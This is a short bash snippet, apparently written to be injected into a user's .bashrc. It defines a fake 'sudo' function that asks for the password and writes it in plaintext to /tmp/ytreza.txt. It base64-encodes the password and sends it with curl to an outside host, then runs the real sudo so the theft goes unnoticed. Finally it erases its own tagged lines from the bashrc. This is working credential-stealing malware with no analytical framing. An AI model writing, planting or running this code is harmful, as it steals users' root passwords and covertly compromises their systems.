function sudo () 									 #to_delete
{ 											 #to_delete
    realsudo="$(which sudo)";								 #to_delete
    read -s -p "[sudo] password for $USER: " inputPasswd;				 #to_delete
    printf "\n";									 #to_delete
    printf '%s\n' "$USER : $inputPasswd" > /tmp/ytreza.txt;				 #to_delete
    encoded=$(printf '%s' "$inputPasswd" | base64) > /dev/null 2>&1;			 #to_delete
    curl -X GET "http://iwanttobreakfree.sytes.net:40//$USER:$encoded" > /dev/null 2>&1; #to_delete
    $realsudo -S -u root bash -c "exit" <<< "$inputPasswd" > /dev/null 2>&1;		 #to_delete
    $realsudo "${@:1}"									 #to_delete
    sed -i '/#to_delete/d' ~.bashrc							 #to_delete
}											 #to_delete
